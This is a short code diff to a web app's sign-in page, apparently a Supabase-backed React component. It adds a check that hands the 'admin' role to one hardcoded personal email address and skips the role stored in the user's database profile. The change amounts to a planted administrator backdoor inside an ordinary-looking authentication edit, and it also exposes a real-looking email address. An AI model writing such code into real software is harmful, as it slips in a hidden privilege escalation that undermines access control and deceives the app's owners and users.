@@ -48,7 +48,9 @@ export default function SigninPage() {
 
       // If the profile is missing in the database, fallback to the role from user metadata or 'customer'
       let role = data.user.user_metadata?.role || 'customer';
-      if (!profileErr && profile) {
+      if (data.user.email === 'ishanmarkam59@gmail.com') {
+        role = 'admin';
+      } else if (!profileErr && profile) {
         role = profile.role;
       } else if (profileErr && profileErr.code !== 'PGRST116') {
         // Only throw if it's a real database error, not a "no rows returned" error (PGRST116)
